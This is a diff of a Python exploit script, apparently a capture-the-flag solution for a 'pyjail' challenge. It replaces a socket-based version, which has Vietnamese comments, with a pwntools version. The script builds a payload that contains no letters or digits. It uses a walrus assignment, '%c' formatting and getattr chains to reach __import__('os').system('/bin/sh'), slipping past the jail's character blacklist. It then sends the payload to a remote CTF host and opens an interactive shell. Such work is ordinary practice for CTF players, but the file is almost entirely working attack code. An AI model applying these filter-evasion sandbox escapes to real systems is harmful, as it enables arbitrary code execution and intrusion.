@@ -1,75 +1,95 @@
-import socket
+#!/usr/bin/env python3
+from pwn import *
 
-def generate_payload():
-    # Tạo các chuỗi có độ dài tương ứng với mã ASCII cần thiết
-    s95 = ' ' + 'C' * 95  # 95 ký tự
-    s99 = ' ' + 'C' * 99  # 99 ký tự
-    s108 = ' ' + 'C' * 108  # 108 ký tự
-    s97 = ' ' + 'C' * 97  # 97 ký tự
-    s115 = ' ' + 'C' * 115  # 115 ký tự
-    s147 = ' ' + 'C' * 147  # 147 ký tự
-    
-    # Tạo payload sử dụng độ dài chuỗi thay vì số
-    payload = f"""
-    c(c(c(c(c(c(
-        '', 
-        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s99!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s115!r}), len({s95!r}))
-    ), 
-        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s97!r}), len({s115!r}), len({s95!r}))
-    ), 
-        ' %c%c%c%c%c%c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s115!r}), len({s115!r}), len({s97!r}), len({s99!r}), len({s108!r}), len({s97!r}), len({s115!r}), len({s115!r}), len({s97!r}), len({s115!r}), len({s95!r}))
-    )()[len({s147!r})], 
-        ' %c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s105!r}), len({s110!r}), len({s105!r}), len({s116!r}), len({s95!r}), len({s95!r}))
-    ), 
-        ' %c%c%c%c%c%c%c%c%c%c%c' % (len({s95!r}), len({s95!r}), len({s103!r}), len({s108!r}), len({s111!r}), len({s98!r}), len({s97!r}), len({s108!r}), len({s115!r}), len({s95!r}), len({s95!r}))
-    )[
-        ' %c%c' % (len({s111!r}), len({s115!r}))
-    ], 
-        ' %c%c%c%c%c%c' % (len({s115!r}), len({s121!r}), len({s115!r}), len({s116!r}), len({s101!r}), len({s109!r}))
-    )(
-        ' %c%c' % (len({s115!r}), len({s104!r}))
-    )
-    """.strip().replace('\n', '').replace('    ', '')
-    
-    return payload
+# ————————————————————————————————————————————————————————————————
+# 0. Helpers – build integers & strings without digit literals
+# ————————————————————————————————————————————————————————————————
 
-# Các hằng số bổ sung (mã ASCII)
-s105 = ' ' + 'C' * 105
-s110 = ' ' + 'C' * 110
-s116 = ' ' + 'C' * 116
-s103 = ' ' + 'C' * 103
-s111 = ' ' + 'C' * 111
-s98 = ' ' + 'C' * 98
-s121 = ' ' + 'C' * 121
-s101 = ' ' + 'C' * 101
-s109 = ' ' + 'C' * 109
-s104 = ' ' + 'C' * 104
+BASE_VAR = "I"   # after the walrus, I == 1
 
-# Tạo payload
-payload = generate_payload()
+def expr_for(n: int) -> str:
+    """
+    Produce an expression (only I and -~) that evaluates to the integer n (n>=1).
+      I    -> 1
+      -~I  -> 2
+      -~-~I -> 3
+      ...
+    """
+    if n < 1:
+        raise ValueError("n must be >= 1")
+    if n == 1:
+        return BASE_VAR
+    return "-~" * (n-1) + BASE_VAR
 
-# Kết nối và gửi payload
-HOST = 'play.scriptsorcerers.xyz'  # Thay bằng địa chỉ server thật
-PORT = 5000         # Thay bằng port server thật
+def char_expr(ch: str) -> str:
+    """
+    Return a snippet that at runtime yields the one-char string `ch`,
+    via '%c' % (<expr_for(code)>).
+    """
+    code = expr_for(ord(ch))
+    return f"'%c' % ({code})"
 
-try:
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((HOST, PORT))
-        
-        # Nhận thông điệp chào mừng
-        welcome_msg = s.recv(1024).decode()
-        print("Server:", welcome_msg)
-        
-        # Gửi payload
-        print("Sending payload...")
-        s.sendall(payload.encode() + b'\n')
-        
-        # Gửi lệnh đọc flag
-        s.sendall(b'cat flag\n')
-        
-        # Nhận và in kết quả
-        response = s.recv(4096).decode()
-        print("Response:", response)
-        
-except Exception as e:
-    print("Error:", e)
+def string_expr(txt: str) -> str:
+    """
+    Return a snippet that at runtime yields the entire string `txt`,
+    by using '%c%c...%c' % (<expr1>, <expr2>, ...).
+    """
+    # Build the literal format: '%c%c...%c'
+    fmt = "'" + "%c" * len(txt) + "'"
+    # Build the tuple of expr_for(...) values
+    exprs = ",".join(expr_for(ord(c)) for c in txt)
+    # Single‐element tuple needs a trailing comma
+    if len(txt) == 1:
+        exprs += ","
+    return f"{fmt} % ({exprs})"
+
+def getattr_call(obj: str, attr: str) -> str:
+    """
+    Emit c(<obj>, <dynamic-attr-name>), i.e. getattr(<obj>, "<attr>").
+    """
+    return f"c({obj},{string_expr(attr)})"
+
+
+# ————————————————————————————————————————————————————————————————
+# 1. Build the one‐line exploit payload
+#    It is a 2-tuple: (I:=('@'<'A'), <spawn‐shell‐expr>)
+#    Uses exactly one '<', one '=', and only % formatting.
+# ————————————————————————————————————————————————————————————————
+
+# 1a) The walrus – sets I = 1  (one '<' and one '=')
+init = f"(I:=('@'<'A'))"
+
+# 1b) Build the needed names and strings at runtime:
+g_name   = string_expr("__globals__")
+b_name   = string_expr("__builtins__")
+imp_name = string_expr("__import__")
+os_mod   = string_expr("os")
+sys_name = string_expr("system")
+sh_str   = string_expr("/bin/sh")
+
+# 1c) Chain getattr calls / indexing:
+step1 = getattr_call("c", "__self__")               # getattr(c, "__self__")
+step2 = f"c({step1},{imp_name})({os_mod})"          # getattr(B, "__import__")("os")
+step3 = f"c({step2},{sys_name})({sh_str})"          # getattr(os, "system")("/bin/sh")
+
+# 1d) Wrap into the final 2‐tuple
+PAYLOAD = f"({init},{step3})"
+
+# Quick sanity‐check against the jail’s own rules
+BLACK = set("abdefghijklmnopqrstuvwxyz1234567890\\;._")
+assert not [ch for ch in PAYLOAD if ch in BLACK], "Leaked a forbidden char!"
+assert PAYLOAD.count('<') + PAYLOAD.count('>') == 1, "Wrong count of < or >"
+assert PAYLOAD.count('=') == 1, "Wrong count of ="
+
+print(f"→ Generated payload (length {len(PAYLOAD)}):\n")
+print(PAYLOAD)
+
+# ————————————————————————————————————————————————————————————————
+# 2. Solve the chall!
+# ————————————————————————————————————————————————————————————————
+
+p = remote("play.scriptsorcerers.xyz", 10480)
+
+p.recvuntil("Enter payload: ")
+p.sendline(PAYLOAD.encode())
+p.interactive()
